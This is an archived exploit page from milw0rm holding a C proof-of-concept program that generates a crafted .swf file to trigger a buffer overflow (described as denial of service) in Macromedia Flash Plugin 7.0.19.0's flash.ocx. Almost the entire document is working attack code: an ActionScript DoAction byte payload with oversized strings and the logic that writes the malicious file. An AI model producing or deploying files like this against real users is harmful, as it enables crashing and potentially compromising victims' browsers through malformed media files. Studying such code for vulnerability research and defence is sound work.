<html><head><title>Macromedia Flash Plugin <= 7.0.19.0 (Action) Denial of Service Exploit </title></head><pre>/*
 
 * ********************************************************* *
 * Macromedia Flash Plugin - Buffer Overflow in flash.ocx    *
 * ********************************************************* *
 * Version: v7.0.19.0                                        *
 * PoC coded by: BassReFLeX                                  *
 * Date: 11 Oct 2005                                         *
 * ********************************************************* *
 
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

void usage(char* file);

/*
&lt;swf&gt;
...
&lt;/swf&gt;
*/
char SWF[] = &quot;&lt;swf&gt;&quot;;
char SWF_[] = &quot;&lt;/swf&gt;&quot;;

//[SetBackgroundColor]
char SetBackgroundColor[] = &quot;\x43\x02\xff\x00\x00&quot;;

//[DoAction] 1 pwn j00r 455!
char DoAction[] = &quot;\x3c\x03\x9b\x08\x00\x41\x41\x41\x41\x41\x41\x41\x41\x00\x40\x00&quot;
		  &quot;\x42\x42\x42\x42\x42\x42\x42\x42\x00\x43\x43\x43\x43\x43\x43\x43&quot;
                  &quot;\x43\x00\x44\x44\x44\x44\x44\x44\x44\x44\x00\x45\x45\x45\x45\x45&quot;
                  &quot;\x45\x45\x45\x00\x46\x46\x46\x46\x46\x46\x46\x46\x00\x00&quot;;

//[ShowFrame]
char ShowFrame[] = &quot;\x40\x00&quot;;

//[End]
char End[] = &quot;\x00\x00&quot;;

int main(int argc,char* argv[])
{
    system(&quot;cls&quot;);
    printf(&quot;\n* ********************************************************* *&quot;);
    printf(&quot;\n* Macromedia Flash Plugin - Buffer Overflow in flash.ocx    *&quot;);
    printf(&quot;\n* ********************************************************* *&quot;);
    printf(&quot;\n* Version: v7.0.19.0                                        *&quot;);
    printf(&quot;\n* Date: 11 Oct 2005                                         *&quot;);
	printf(&quot;\n* ProofOfConcept(POC) coded by: BassReFLeX                  *&quot;);
    printf(&quot;\n* ********************************************************* *&quot;);
    
    if ( argc!=2 )
    {
        usage(argv[0]);
    }
    
    FILE *f;
    f = fopen(argv[1],&quot;w&quot;);
    if ( !f )
    {
        printf(&quot;\nFile couldn't open!&quot;);
        exit(1);
    }
                         
    printf(&quot;\n\nWriting crafted .swf file . . .&quot;);
    fwrite(SWF,1,sizeof(SWF),f);
    fwrite(&quot;\n&quot;,1,1,f);
    fwrite(SetBackgroundColor,1,sizeof(SetBackgroundColor),f);
    fwrite(&quot;\n&quot;,1,1,f);
    fwrite(DoAction,1,sizeof(DoAction),f);
    fwrite(&quot;\n&quot;,1,1,f);
	fwrite(ShowFrame,1,sizeof(ShowFrame),f);
    fwrite(&quot;\n&quot;,1,1,f);
	fwrite(End,1,sizeof(End),f);
	fwrite(&quot;\n&quot;,1,1,f);
	fwrite(SWF_,1,sizeof(SWF_),f);
	printf(&quot;\nFile created successfully!&quot;);
    printf(&quot;\nFilename: %s&quot;,argv[1]);
    return 0;
}        

void usage(char* file)
{
    printf(&quot;\n\n&quot;);
    printf(&quot;\n%s &lt;Filename&gt;&quot;,file);
    printf(&quot;\n\nFilename = .swf crafted file. Eg: overflow.swf&quot;);
    exit(1);
}

// milw0rm.com [2005-11-18]</pre></html>